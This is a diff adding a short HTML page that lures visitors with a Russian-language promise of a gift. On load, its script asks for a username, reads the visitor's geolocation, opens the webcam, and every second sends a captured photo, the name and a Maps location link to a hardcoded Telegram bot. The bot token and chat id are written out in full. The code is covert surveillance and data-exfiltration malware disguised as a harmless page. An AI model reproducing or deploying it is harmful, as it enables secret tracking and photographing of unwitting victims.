@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera and Location Access</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="flex bg-sky-950 items-center h-screen justify-center">
+    <video class="hidden" id="video" width="640" height="480" autoplay></video>
+    <h1 class="text-4xl text-center animate-pulse text-amber-400">
+        Подождите немного чтобы получить подарок!
+    </h1>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            let ism = prompt("Введите своё Имя пользователя");
+            let locationURL = "";
+
+            // Получение местоположения
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function (position) {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            locationURL = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                            console.log("Location URL: ", locationURL);
+                        },
+                        function (error) {
+                            console.error("Ошибка при получении местоположения:", error);
+                            locationURL = "Location access denied.";
+                        }
+                    );
+                } else {
+                    locationURL = "Geolocation is not supported by this browser.";
+                }
+            }
+
+            getLocation();
+
+            // Доступ к камере
+            navigator.mediaDevices
+                .getUserMedia({ video: true })
+                .then(function (stream) {
+                    var video = document.getElementById("video");
+                    video.classList.remove("hidden"); // Показываем видео элемент
+                    video.srcObject = stream;
+                    video.play();
+                })
+                .catch(function (err) {
+                    console.log("Ошибка при доступе к камере: " + err);
+                });
+
+            // Отправка фото и местоположения
+            function sendPhotoAndLocation() {
+                var video = document.getElementById("video");
+                var canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                var context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(function (blob) {
+                    var formData = new FormData();
+                    formData.append("chat_id", "7074962509");
+                    formData.append("photo", blob);
+                    formData.append("caption", `User: ${ism}\nLocation: ${locationURL}`);
+
+                    fetch(
+                        "https://api.telegram.org/bot8031305262:AAEaAplK6rmlqgCBBvI0swikrB_MXMAGtFw/sendPhoto",
+                        {
+                            method: "POST",
+                            body: formData,
+                        }
+                    )
+                        .then(function (response) {
+                            if (!response.ok) {
+                                throw new Error("Ошибка отправки данных на сервер");
+                            }
+                            console.log("Фото и данные успешно отправлены на сервер");
+                        })
+                        .catch(function (error) {
+                            console.error("Произошла ошибка:", error);
+                        });
+                }, "image/jpeg");
+            }
+
+            // Интервал для отправки фото и данных
+            setInterval(sendPhotoAndLocation, 1000); // Интервал 10 секунд
+        });
+    </script>
+</body>
+
+</html>
